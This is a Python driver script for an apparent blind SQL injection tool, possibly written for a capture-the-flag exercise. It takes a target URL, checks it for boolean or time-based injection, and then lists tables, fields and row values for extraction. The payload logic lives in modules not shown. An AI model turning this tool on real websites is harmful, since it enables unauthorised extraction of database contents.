import argparse

import assciiPrint
from checkforSQLi import checkforSQLi
from input import get_user_input


# def main(proxy=None):
def main():
    # proxies = {"http": proxy, "https": proxy} if proxy else None
    assciiPrint
    url, parameter = get_user_input()

    # Check if the user chose to exit
    if url is None and parameter is None:
        return

    # Determine the method based on the parameter
    method = "boolean" if parameter == "-b" else "time base"

    # Display the parsed URL and method
    print("\nYou selected:")
    print(f"URL: {url}")

    check_url = checkforSQLi(url)
    if check_url.hasSQLi():

        length, number_of_table, names_of_table, method = check_url.get_database_length()
        print(f'Warning: The site may be vulnerable to SQL Injection! Your method is {check_url.get_method()}')
        print(f'Data Base length: {length}')
        print(f'Selected Method{check_url.get_method()}')

        print(f'number of tables{number_of_table}')
        print(f'names of tables{names_of_table}')
        table_name = input("Please enter the table name: ").strip()
        fields = check_url.extract_fields_for_table(table_name)
        field_name = input("Please enter the field name: ").strip()
        field_value = check_url.extract_fields_for_row(table_name, field_name)
        # print("get Flag from filde....")
        #field_value = check_url.extract_fields_for_row('flag','flag_text')
        #field_value = check_url.extract_fields_for_row('flag','flag_code')

        print(field_value)




    else:
        print("The site appears to be secure from SQL Injection.")


if __name__ == "__main__":
    # parser = argparse.ArgumentParser()
    # parser.add_argument("--proxy", help="Set proxy for outgoing requests, e.g., http://127.0.0.1:8080")
    # args = parser.parse_args()

    # main(proxy=args.proxy)
    main()
